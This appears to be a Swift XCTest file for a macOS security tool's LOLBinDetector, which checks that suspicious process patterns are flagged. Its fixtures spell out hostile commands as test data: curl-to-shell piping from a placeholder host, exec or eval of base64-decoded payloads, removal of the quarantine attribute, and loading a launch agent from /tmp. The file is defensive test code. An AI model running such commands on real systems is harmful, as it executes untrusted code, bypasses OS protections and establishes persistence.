// MARK: - Nick
// Copyright © 2026 Ehsan Azish — github.com/EhsanAzish80
// Licensed under AGPL-3.0. See LICENSE for details.

import XCTest
@testable import Nick

// MARK: - LOLBinDetectorTests

final class LOLBinDetectorTests: XCTestCase {

    // MARK: - Helpers

    private func makeProc(
        pid: Int32 = 100,
        name: String,
        path: String = "/bin/bash",
        parentPID: Int32 = 1,
        parentName: String = "",
        arguments: [String] = []
    ) -> NickProcessInfo {
        NickProcessInfo(
            pid: pid,
            path: path,
            name: name,
            parentPID: parentPID,
            parentName: parentName,
            signingStatus: .adHoc,
            metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: arguments)
        )
    }

    // MARK: - curl pipe shell

    func test_evaluate_bashWithCurlParentOnly_returnsNil() {
        let proc = makeProc(name: "bash", parentName: "curl")
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: "curl"))
    }

    func test_evaluate_shWithCurlInArgs_returnsCriticalSignal() {
        // curl in path string simulates argv[0] from parent
        let procWithCurlPath = NickProcessInfo(
            pid: 101, path: "/bin/sh", name: "sh",
            parentPID: 1, parentName: "curl",
            signingStatus: .adHoc, metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["-c", "curl https://example.invalid/payload | sh"])
        )
        let signal = LOLBinDetector.evaluate(procWithCurlPath, parentName: "curl")
        XCTAssertNotNil(signal)
    }

    func test_evaluate_bashWithWgetParentOnly_returnsNil() {
        let proc = makeProc(name: "bash", parentName: "wget")
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: "wget"))
    }

    // MARK: - osascript

    func test_evaluate_osascriptWithShellScript_returnsHighSignal() {
        let proc = NickProcessInfo(
            pid: 102, path: "/usr/bin/osascript", name: "osascript",
            parentPID: 1, parentName: "",
            signingStatus: .signed(teamID: "APPLE"), metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["-e", "do shell script \"id\""])
        )
        let signal = LOLBinDetector.evaluate(proc, parentName: nil)
        XCTAssertNotNil(signal)
        XCTAssertEqual(signal?.severity, .high)
    }

    // MARK: - xattr quarantine removal

    func test_evaluate_xattrRemovingQuarantine_returnsHighSignal() {
        let proc = NickProcessInfo(
            pid: 103, path: "/usr/bin/xattr", name: "xattr",
            parentPID: 1, parentName: "",
            signingStatus: .signed(teamID: "APPLE"), metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["-d", "com.apple.quarantine", "/tmp/app"])
        )
        let signal = LOLBinDetector.evaluate(proc, parentName: nil)
        XCTAssertNotNil(signal)
        XCTAssertEqual(signal?.severity, .high)
    }

    // MARK: - base64 payload

    func test_evaluate_python3ImportingBase64_returnsNil() {
        let proc = makeProc(name: "python3", path: "/usr/bin/python3", arguments: ["-c", "import base64"])
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: nil))
    }

    func test_evaluate_python3ExecutingDecodedBase64_returnsHighSignal() {
        let proc = makeProc(name: "python3", path: "/usr/bin/python3", arguments: ["-c", "exec(base64.b64decode(payload))"])
        XCTAssertEqual(LOLBinDetector.evaluate(proc, parentName: nil)?.severity, .high)
    }

    func test_evaluate_rubyRequiringBase64_returnsNil() {
        let proc = makeProc(name: "ruby", path: "/usr/bin/ruby", arguments: ["-e", "require base64"])
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: nil))
    }

    func test_evaluate_rubyEvaluatingDecodedBase64_returnsHighSignal() {
        let proc = makeProc(name: "ruby", path: "/usr/bin/ruby", arguments: ["-e", "eval(Base64.decode64(payload))"])
        XCTAssertEqual(LOLBinDetector.evaluate(proc, parentName: nil)?.severity, .high)
    }

    // MARK: - launchctl from tmp

    func test_evaluate_launchctlLoadFromTmp_returnsCriticalSignal() {
        let proc = NickProcessInfo(
            pid: 106, path: "/bin/launchctl", name: "launchctl",
            parentPID: 1, parentName: "",
            signingStatus: .signed(teamID: "APPLE"), metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["load", "/tmp/com.evil.plist"])
        )
        let signal = LOLBinDetector.evaluate(proc, parentName: nil)
        XCTAssertNotNil(signal)
        XCTAssertEqual(signal?.severity, .critical)
    }

    func test_evaluate_launchctlPrintMentioningTmp_returnsNil() {
        let proc = makeProc(name: "launchctl", path: "/bin/launchctl", arguments: ["print", "gui/501/tmp.example"])
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: nil))
    }

    func test_evaluate_xattrReadingQuarantine_returnsNil() {
        let proc = makeProc(name: "xattr", path: "/usr/bin/xattr", arguments: ["-p", "com.apple.quarantine", "/tmp/app"])
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: nil))
    }

    func test_evaluate_crontabList_returnsNil() {
        let proc = makeProc(name: "crontab", path: "/usr/bin/crontab", arguments: ["-l"])
        XCTAssertNil(LOLBinDetector.evaluate(proc, parentName: nil))
    }

    func test_evaluate_crontabEdit_returnsMediumSignal() {
        let proc = makeProc(name: "crontab", path: "/usr/bin/crontab", arguments: ["-e"])
        XCTAssertEqual(LOLBinDetector.evaluate(proc, parentName: nil)?.severity, .medium)
    }

    // MARK: - Trusted parent suppression

    func test_evaluate_trustedParentTerminal_returnsNil() {
        let proc = makeProc(name: "bash", parentName: "Terminal")
        let trusted = TrustedProcessList()
        // Terminal is in builtIn list
        let signal = LOLBinDetector.evaluate(proc, parentName: "Terminal", trustedProcessList: trusted)
        XCTAssertNil(signal)
    }

    // MARK: - Safe process — no match

    func test_evaluate_safariNoMatch_returnsNil() {
        let proc = makeProc(name: "Safari", path: "/Applications/Safari.app")
        let signal = LOLBinDetector.evaluate(proc, parentName: nil)
        XCTAssertNil(signal)
    }

    func test_evaluate_grepNormalArgs_returnsNil() {
        let proc = makeProc(name: "grep", path: "/usr/bin/grep", arguments: ["pattern", "/var/log/system.log"])
        let signal = LOLBinDetector.evaluate(proc, parentName: nil)
        XCTAssertNil(signal)
    }

    // MARK: - signals(from:)

    func test_signals_multipleLOLBinProcesses_returnsExpectedCount() {
        let processes: [NickProcessInfo] = [
            NickProcessInfo(pid: 200, path: "/bin/bash", name: "bash",
                            parentPID: 1, parentName: "curl",
                            signingStatus: .adHoc, metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["-c", "curl https://example.invalid/payload | bash"])),
            NickProcessInfo(pid: 201, path: "/usr/bin/xattr", name: "xattr",
                            parentPID: 1, parentName: "",
                            signingStatus: .signed(teamID: "APPLE"), metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["-d", "com.apple.quarantine", "/tmp/app"])),
            makeProc(pid: 202, name: "Safari", path: "/Applications/Safari.app"),
        ]
        let signals = LOLBinDetector.signals(from: processes)
        XCTAssertEqual(signals.count, 2)
    }

    func test_signals_noLOLBinProcesses_returnsEmpty() {
        let processes = [makeProc(name: "Safari"), makeProc(pid: 300, name: "Finder")]
        let signals = LOLBinDetector.signals(from: processes)
        XCTAssertTrue(signals.isEmpty)
    }

    func test_signals_trustedParentDoesNotHideStrongPattern() {
        let processes = [
            NickProcessInfo(pid: 400, path: "/bin/bash", name: "bash",
                            parentPID: 1, parentName: "Terminal",
                            signingStatus: .adHoc, metadata: ProcessMetadata(user: "user", startTime: Date(), arguments: ["-c", "curl https://example.invalid/payload | bash"]))
        ]
        let signals = LOLBinDetector.signals(from: processes)
        XCTAssertEqual(signals.first?.severity, .critical)
        XCTAssertEqual(signals.first?.metadata["reason"], "curl_pipe_shell")
    }

    func test_signals_codeHelperParentDoesNotHideStrongPattern() {
        let processes = [
            NickProcessInfo(pid: 401, path: "/bin/bash", name: "bash",
                            parentPID: 2, parentName: "Code Helper",
                            signingStatus: .adHoc, metadata: ProcessMetadata(user: "user", startTime: Date(), arguments: ["-c", "curl https://example.invalid/payload | bash"]))
        ]
        let signals = LOLBinDetector.signals(from: processes)
        XCTAssertEqual(signals.first?.severity, .critical)
    }

    // MARK: - Metadata

    func test_evaluate_signal_containsDetectorMetadata() {
        let proc = NickProcessInfo(
            pid: 500, path: "/usr/bin/xattr", name: "xattr",
            parentPID: 1, parentName: "",
            signingStatus: .signed(teamID: "APPLE"), metadata: ProcessMetadata(user: "root", startTime: Date(), arguments: ["-d", "com.apple.quarantine", "/tmp/x"])
        )
        let signal = LOLBinDetector.evaluate(proc, parentName: nil)
        XCTAssertEqual(signal?.metadata["detector"], "LOLBinDetector")
    }
}
